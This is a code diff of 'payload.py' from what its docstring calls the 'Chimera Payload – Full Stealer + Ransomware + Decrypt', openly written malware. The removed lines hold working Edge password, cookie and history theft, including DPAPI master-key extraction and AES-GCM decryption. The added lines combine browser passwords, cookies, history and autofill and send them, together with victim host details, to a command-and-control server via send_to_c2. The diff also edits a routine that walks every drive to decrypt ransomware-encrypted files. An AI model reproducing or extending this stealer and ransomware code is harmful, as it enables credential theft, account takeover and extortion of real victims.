@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+#~/Desktop/Chimera/PayloadBuilder/payload.py
 """
 Chimera Payload – Full Stealer + Ransomware + Decrypt
 Modular architecture; all collectors in modules/
@@ -17,6 +18,7 @@ import platform
 import shutil
 import threading
 from datetime import datetime
+from pathlib import Path
 
 # Import modules (only these are used)
 from modules.system_collector import SystemCollector
@@ -158,13 +160,18 @@ def decrypt_full_system():
         if not data.get('exists'):
             return "Decryption failed: No keys found on server."
         private_key_b64 = data['private_key']
-        hmac_keys = data['hmac_keys']
+        hmac_keys = data['hmac_keys']   # dict: filepath -> base64 hmac key
         if not private_key_b64:
             return "Decryption failed: Private key missing."
         private_key_bytes = base64.b64decode(private_key_b64)
+
         decrypted_count = 0
         failed_count = 0
         failed_files = []
+
+        # Normalize all paths in hmac_keys to avoid mismatch
+        normalized_hmac = {os.path.normpath(k): v for k, v in hmac_keys.items()}
+
         for drive in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
             drive_path = f"{drive}:\\"
             if not os.path.exists(drive_path):
@@ -173,7 +180,8 @@ def decrypt_full_system():
                 for file in files:
                     if file.endswith('.encrypted'):
                         full_path = os.path.join(root, file)
-                        hmac_key_b64 = hmac_keys.get(full_path)
+                        norm_path = os.path.normpath(full_path)
+                        hmac_key_b64 = normalized_hmac.get(norm_path)
                         if hmac_key_b64:
                             try:
                                 hmac_key_bytes = base64.b64decode(hmac_key_b64)
@@ -183,6 +191,7 @@ def decrypt_full_system():
                                     hmac_key_bytes
                                 )
                                 decrypted_count += 1
+                                log(f"Decrypted: {full_path}")
                             except Exception as e:
                                 log(f"Failed to decrypt {full_path}: {e}")
                                 failed_count += 1
@@ -191,6 +200,7 @@ def decrypt_full_system():
                             log(f"HMAC key not found for {full_path}")
                             failed_count += 1
                             failed_files.append(full_path)
+
         result_msg = f"Decryption finished. Success: {decrypted_count}, Failed: {failed_count}"
         if failed_files:
             result_msg += f"\nFailed files: {', '.join(failed_files[:10])}"
@@ -202,7 +212,7 @@ def decrypt_full_system():
     except Exception as e:
         log(f"Decryption error: {e}")
         return f"Decryption error: {str(e)}"
-
+                
 # ========== COMMAND EXECUTION ==========
 def execute_command(command):
     if command == "START_RANSOMWARE":
@@ -341,216 +351,38 @@ def capture_screenshot():
         log(f"Screenshot error: {e}")
         return None
 
-# ========== EDGE FUNCTIONS (unchanged) ==========
-def get_edge_master_key():
+# ========== Browser Data ==========
+
+def send_browser_data():
+    """Use CredentialCollector to extract browser data and send as 'browser_data'."""
     try:
-        import win32crypt
-        local_state_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State")
-        if not os.path.exists(local_state_path):
-            log("Edge Local State not found")
-            return None
-        with open(local_state_path, 'r', encoding='utf-8') as f:
-            local_state = json.load(f)
-        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-        encrypted_key = encrypted_key[5:]
-        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        log("✅ Edge master key retrieved")
-        return master_key
+        creds = CredentialCollector.collect()
+        browsers = creds.get('browsers', [])
+        combined = {
+            "passwords": [],
+            "cookies": [],
+            "history": [],
+            "autofill": []
+        }
+        for browser in browsers:
+            combined["passwords"].extend(browser.get("passwords", []))
+            combined["cookies"].extend(browser.get("cookies", []))
+            combined["history"].extend(browser.get("history", []))
+            combined["autofill"].extend(browser.get("autofill", []))
+        
+        log(f"📊 Combined browser data - History: {len(combined['history'])}, "
+            f"Passwords: {len(combined['passwords'])}, Cookies: {len(combined['cookies'])}")
+        
+        data = {
+            "victim_id": get_victim_id(),
+            "type": "browser_data",
+            "content": combined
+        }
+        return send_to_c2("/api/collect", data)
     except Exception as e:
-        log(f"Master key error: {e}")
-        return None
-
-def decrypt_edge_data(encrypted_data, master_key):
-    try:
-        from Crypto.Cipher import AES
-        if not master_key:
-            return None
-        if encrypted_data.startswith(b'v10') or encrypted_data.startswith(b'v11'):
-            encrypted_data = encrypted_data[3:]
-            nonce = encrypted_data[3:15]
-            ciphertext = encrypted_data[15:-16]
-            tag = encrypted_data[-16:]
-            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
-            return decrypted.decode('utf-8')
-        else:
-            import win32crypt
-            return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1].decode('utf-8')
-    except Exception as e:
-        log(f"Decrypt error: {e}")
-        return None
-
-def get_edge_passwords():
-    passwords = []
-    master_key = get_edge_master_key()
-    if not master_key:
-        log("❌ Could not get master key")
-        return passwords
-    edge_login_paths = [
-        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
-        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data")
-    ]
-    for login_path in edge_login_paths:
-        if os.path.exists(login_path):
-            try:
-                temp_path = os.path.join(os.environ['TEMP'], 'edge_login_temp.db')
-                shutil.copy2(login_path, temp_path)
-                conn = sqlite3.connect(temp_path)
-                cursor = conn.cursor()
-                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                count = 0
-                for row in cursor.fetchall():
-                    url, username, enc_password = row
-                    if enc_password:
-                        password = decrypt_edge_data(enc_password, master_key)
-                        if password:
-                            passwords.append({
-                                "browser": "Edge",
-                                "url": url if url else "",
-                                "username": username if username else "",
-                                "password": password
-                            })
-                            count += 1
-                conn.close()
-                os.remove(temp_path)
-                log(f"✅ Edge passwords: {count} found")
-                return passwords
-            except Exception as e:
-                log(f"Edge passwords error: {e}")
-                try:
-                    os.remove(temp_path)
-                except:
-                    pass
-    return passwords
-
-def get_edge_cookies():
-    cookies = []
-    master_key = get_edge_master_key()
-    if not master_key:
-        log("❌ Could not get master key for cookies")
-        return cookies
-    edge_cookie_paths = [
-        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"),
-        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies")
-    ]
-    for cookie_path in edge_cookie_paths:
-        if os.path.exists(cookie_path):
-            try:
-                temp_path = os.path.join(os.environ['TEMP'], 'edge_cookies_temp.db')
-                shutil.copy2(cookie_path, temp_path)
-                conn = sqlite3.connect(temp_path)
-                cursor = conn.cursor()
-                try:
-                    cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies LIMIT 200")
-                except:
-                    cursor.execute("SELECT host_key, name, value, path, expires_utc FROM cookies LIMIT 200")
-                    for row in cursor.fetchall():
-                        host_key, name, value, path, expires_utc = row
-                        if value:
-                            cookies.append({
-                                "browser": "Edge",
-                                "domain": host_key if host_key else "",
-                                "name": name if name else "",
-                                "value": value,
-                                "path": path if path else "/",
-                                "expires": str(expires_utc) if expires_utc else ""
-                            })
-                    conn.close()
-                    os.remove(temp_path)
-                    log(f"✅ Edge cookies (plain): {len(cookies)} found")
-                    return cookies
-                count = 0
-                for row in cursor.fetchall():
-                    host_key, name, encrypted_value, path, expires_utc = row
-                    if encrypted_value:
-                        value = decrypt_edge_data(encrypted_value, master_key)
-                        if value:
-                            cookies.append({
-                                "browser": "Edge",
-                                "domain": host_key if host_key else "",
-                                "name": name if name else "",
-                                "value": value,
-                                "path": path if path else "/",
-                                "expires": str(expires_utc) if expires_utc else ""
-                            })
-                            count += 1
-                conn.close()
-                os.remove(temp_path)
-                log(f"✅ Edge cookies: {count} found")
-                return cookies
-            except Exception as e:
-                log(f"Edge cookies error: {e}")
-                try:
-                    os.remove(temp_path)
-                except:
-                    pass
-    return cookies
-
-def get_edge_history():
-    history = []
-    edge_paths = [
-        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"),
-        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\History")
-    ]
-    for history_path in edge_paths:
-        if os.path.exists(history_path):
-            try:
-                temp_path = os.path.join(os.environ['TEMP'], 'edge_history_temp.db')
-                shutil.copy2(history_path, temp_path)
-                conn = sqlite3.connect(temp_path)
-                cursor = conn.cursor()
-                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
-                for row in cursor.fetchall():
-                    url, title, timestamp = row
-                    history.append({
-                        "browser": "Edge",
-                        "url": url if url else "",
-                        "title": title if title else "",
-                        "timestamp": str(timestamp) if timestamp else ""
-                    })
-                conn.close()
-                os.remove(temp_path)
-                log(f"✅ Edge history: {len(history)} entries")
-                return history
-            except Exception as e:
-                log(f"Edge history error: {e}")
-                try:
-                    os.remove(temp_path)
-                except:
-                    pass
-    return history
-
-def get_browser_data():
-    data = {
-        "history": [],
-        "passwords": [],
-        "cookies": []
-    }
-    log("📊 Collecting Edge data...")
-    data["history"] = get_edge_history()
-    data["passwords"] = get_edge_passwords()
-    data["cookies"] = get_edge_cookies()
-    log(f"📊 Summary - History: {len(data['history'])}, Passwords: {len(data['passwords'])}, Cookies: {len(data['cookies'])}")
-    return data
-
-def register():
-    info = get_system_info()
-    data = {
-        "victim_id": get_victim_id(),
-        "hostname": info["hostname"],
-        "ip": info["ip"],
-        "mac": info["mac"],
-        "os": info["os"],
-        "os_version": info["os_version"],
-        "architecture": info["architecture"],
-        "cpu": info.get("cpu", "Unknown"),
-        "memory": info.get("memory", "Unknown"),
-        "disk": json.dumps(info.get("disks", [])),
-        "username": info.get("username", "Unknown"),
-        "domain": info.get("domain", "Unknown")
-    }
-    return send_to_c2("/api/register", data)
-
+        log(f"Error in send_browser_data: {e}")
+        return False
+        
 def send_system_info():
     info = get_system_info()
     data = {"victim_id": get_victim_id(), "type": "system_info", "content": info}
@@ -567,14 +399,6 @@ def send_screenshot():
     }
     return send_to_c2("/api/collect", data)
 
-def send_browser_data():
-    browser_data = get_browser_data()
-    data = {
-        "victim_id": get_victim_id(),
-        "type": "browser_data",
-        "content": browser_data
-    }
-    return send_to_c2("/api/collect", data)
 
 def get_commands():
     try:
@@ -612,6 +436,26 @@ def send_enhanced_data():
     user_data = UserDataCollector.collect()
     send_to_c2('/api/collect', {"victim_id": vid, "type": "user_data", "content": user_data})
     log("Enhanced data sent.")
+
+#=========== register============
+def register():
+    info = get_system_info()
+    data = {
+        "victim_id": get_victim_id(),
+        "hostname": info["hostname"],
+        "ip": info["ip"],
+        "mac": info["mac"],
+        "os": info["os"],
+        "os_version": info["os_version"],
+        "architecture": info["architecture"],
+        "cpu": info.get("cpu", "Unknown"),
+        "memory": info.get("memory", "Unknown"),
+        "disk": json.dumps(info.get("disks", [])),
+        "username": info.get("username", "Unknown"),
+        "domain": info.get("domain", "Unknown")
+    }
+    return send_to_c2("/api/register", data)
+
 
 # ========== MAIN LOOP ==========
 def main():
